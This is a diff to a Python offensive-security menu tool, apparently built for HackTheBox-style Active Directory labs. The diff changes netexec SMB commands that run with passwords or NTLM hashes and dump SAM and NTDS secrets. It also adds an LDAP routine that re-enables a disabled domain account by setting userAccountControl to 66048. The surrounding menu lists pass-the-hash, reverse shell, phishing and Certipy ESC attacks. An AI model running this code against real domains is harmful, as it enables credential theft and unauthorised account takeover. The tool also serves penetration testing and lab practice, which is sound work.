@@ -41,7 +41,8 @@ from collections import OrderedDict
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
-from ldap3 import ALL, Server, Connection, NTLM, extend, SUBTREE
+from ldap3.core.exceptions import LDAPBindError
+from ldap3 import ALL, Server, Connection, extend, SUBTREE, NTLM, MODIFY_REPLACE
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -792,13 +793,13 @@ def options():
    print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) FUZZ Sub-DOM (605) BloodHoundDump (705) Certipy ESC5 (715) Certify   ESC15  " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) MAN CHISEL64 (606) BloodyADd User (706) Certipy ESC6 (716) Certify   ESC16  " + '\u2551')
    print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) AUTOCHISEL64 (607) BloodyADdGroup (707) Certipy ESC7 (717) Certify   ESC17  " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608)                (708) Certipy ESC8                        " + '\u2551')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449) SSHPort4Ward (608) ReactivateUser (708) Certipy ESC8 (718)                  " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Enum4Linux    (70)             (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240) RunLineCommand  (350) LFI     Wordlist (450)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ')
    else:
       print(menuName.rstrip(" "), end= ' ')
-   print("(609) BloodHound GUI (709) Certipy ESC9                        " + '\u2551')
+   print("(609) BloodHound GUI (709) Certipy ESC9 (719)                  " + '\u2551')
    print('\u255A' + '\u2550'*292 + '\u255D')
    return
    
@@ -4603,7 +4604,7 @@ while True:
                print("\n[+] Enumerating shares...\n")
                remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --sessions")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --qwinsta")               
                print("\n[+] Enumerating SAM...\n")
                remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
@@ -4625,7 +4626,7 @@ while True:
                print("\n[+] Enumerating shares...\n")
                remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --shares")               
                print("\n[+] Enumerating sessions...\n")
-               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --sessions")               
+               remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --qwinsta")               
                print("\n[+] Enumerating SAM...\n")
                remoteCOM("nxc smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "' --local-auth --sam")               
                print("\n[+] Enumerating NTDS...\n")
@@ -4731,7 +4732,88 @@ while True:
 #      localCOM("xdotool type 'firefox http://localhost:7474'; xdotool key Return")
 #      localCOM("xdotool key Ctrl+Tab") 
 #      prompt() 
-      
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE     
+# Details : Menu option selected - Reactive disabled password                                                    
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '608':
+      print(colored("[*] Reactivating disabled account...", colour3))   
+      BAK = TIP
+      try:
+         TIP = TIP.strip()
+         if not TIP.startswith('ldap://'):
+            TIP = 'ldap://' + TIP
+         tserver = Server(TIP, get_info=ALL)
+         AD1 = input("[?] Please enter account user's name: ").strip()
+         tUsername = DOM.rstrip(" ") + "\\" + USR.strip()
+         tPassword = PAS.strip()
+         tconn = Connection(
+            tserver,
+            user=tUsername,
+            password=tPassword,
+            authentication=NTLM,
+            auto_bind=True,
+            auto_referrals=False
+         )
+         if DOM.endswith('.htb'):
+            temp = DOM[:-4]
+         else:
+            temp = DOM
+         domain_parts = temp.strip().split('.')
+         dc_string = ','.join(f'DC={part}' for part in domain_parts)
+         user_dn = f'CN={AD1},CN=Users,{dc_string}'
+         tconn.modify(
+            dn=user_dn,
+            changes={
+               'userAccountControl': [(MODIFY_REPLACE, ['66048'])]
+            }
+         )
+         if tconn.result['description'] == 'success':
+            print('[+] Modification successful.')
+         else:
+            print(f"[-] Modification failed: {tconn.result}")
+         tconn.unbind()
+      except LDAPBindError:
+         print("[-] Invalid credentials. Could not bind to the LDAP server.")
+      except LDAPSocketOpenError as e:
+         print(f"[-] Referral or socket error: {e}")
+      except LDAPReferralError as e:
+         referrals = e.referrals if hasattr(e, 'referrals') else []
+         if referrals:
+            print(f"[+] Referral received: {referrals[0]}")
+            referred_ldap_url = referrals[0]
+            tserver = Server(referred_ldap_url, get_info=ALL)
+            tconn = Connection(
+               tserver,
+               user=tUsername,
+               password=tPassword,
+               authentication=NTLM,
+               auto_bind=True,
+               auto_referrals=False
+            )           
+            tconn.modify(
+               dn=user_dn,
+               changes={
+                  'userAccountControl': [(MODIFY_REPLACE, ['66048'])]
+               }
+            )
+            if tconn.result['description'] == 'success':
+               print('[+] Modification successful after following referral.')
+            else:
+               print(f"[+- Modification failed after referral: {tconn.result}")
+            tconn.unbind()
+         else:
+            print("[-] Referral error occurred but no referrals found.")
+      except Exception as e:
+         print(f"[-] An unexpected error occurred: {e}")
+      TIP = BAK
+      prompt()
+            
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
